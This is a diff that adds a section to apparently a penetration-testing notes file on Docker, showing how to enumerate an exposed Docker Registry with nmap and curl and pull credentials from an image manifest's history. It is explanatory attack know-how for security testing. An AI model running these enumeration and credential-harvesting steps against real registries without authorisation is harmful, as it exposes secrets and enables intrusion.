@@ -48,3 +48,46 @@ Protect Docker daemon socket. To accomplish that you can:
 
 ## A final note
 Actually I faced this scenario in a real engagement.
+
+## Abuse Docker Registry to get repo manifest
+### Discover
+
+     nmap -sV docker-srv.local
+     ...
+     PORT     STATE SERVICE VERSION
+    ...
+    5000/tcp open  http    Docker Registry (API: 2.0)
+    7000/tcp open  http    Docker Registry (API: 2.0)
+
+### List all registered repo for the second registry
+
+    curl http://docker-srv.local:7000/v2/_catalog
+    {"repositories":["app01/webserver"]}
+
+### List all tags related to the repo
+
+    curl http://docker-srv.local:7000/v2/app01/webserver/tags/list
+    {"name":"app01/webserver","tags":["prod"]}
+
+### Get the related manifest file for the tag
+
+    curl http://docker-srv.local:7000/v2/app01/webserver/manifests/prod
+    ...
+    {
+       "schemaVersion": 1,
+       "name": "app01/webserver",
+       "tag": "prod",
+       "architecture": "amd64",
+       "fsLayers": [
+          {
+             "blobSum": "sha256:7a668bba7a1a84d9db8a2fb2826f777e64233780a110041db8d42b77515cf57"
+          },
+    ....
+    "history": [
+      {
+         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\
+         ...
+         "printf \\\"Username: admin\\\\nPassword: _admin\\\\n\\\" \\xxxxxxx /var/www/html/database.config\"],\"Image\":\"sha256:1e4a2d11384ed8ac500f2762825c3f3d134ad5d78813a5d044357b66d4c91800\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\"
+         ....
+
+Above we can see that we retrived the credentials for the a DB, from the history
